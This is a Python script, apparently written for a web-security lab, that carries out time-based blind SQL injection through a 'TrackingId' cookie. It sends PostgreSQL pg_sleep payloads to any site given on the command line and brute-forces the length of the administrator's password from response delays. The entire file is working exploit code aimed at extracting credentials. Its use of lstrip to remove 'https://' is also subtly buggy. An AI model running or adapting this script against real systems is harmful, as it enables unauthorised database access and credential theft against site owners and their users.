import requests
import sys

# Get the site from command-line argument
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'

# Function to send crafted cookie and return response time
def test_cookie(cookie_string):
    cookie_data = {
        'TrackingId': cookie_string
    }
    resp = requests.get(url, cookies=cookie_data)
    return resp.elapsed.total_seconds()

# Step 1: Confirm injection still works (optional sanity check)
elapsed = test_cookie("x")
print(f'Request "x" returned in {elapsed} seconds')

elapsed = test_cookie("x\' || pg_sleep(3) -- ")
print(f'Request "x\' || pg_sleep(3) -- " returned in {elapsed} seconds')

# Step 2: Brute-force the length of administrator's password
print("\n[*] Brute-forcing administrator password length...\n")

for num in range(32):  # Try lengths 1 to 31
    payload = f"""x'%3Bselect case when (username='administrator' and length(password)={num}) then pg_sleep(3) else pg_sleep(0) end from users--"""
    elapsed = test_cookie(payload)
    print(f'Tested length {num}, response time: {elapsed} seconds')

    if elapsed > 3:
        print(f'\n[+] Administrator password length is: {num}')
        break
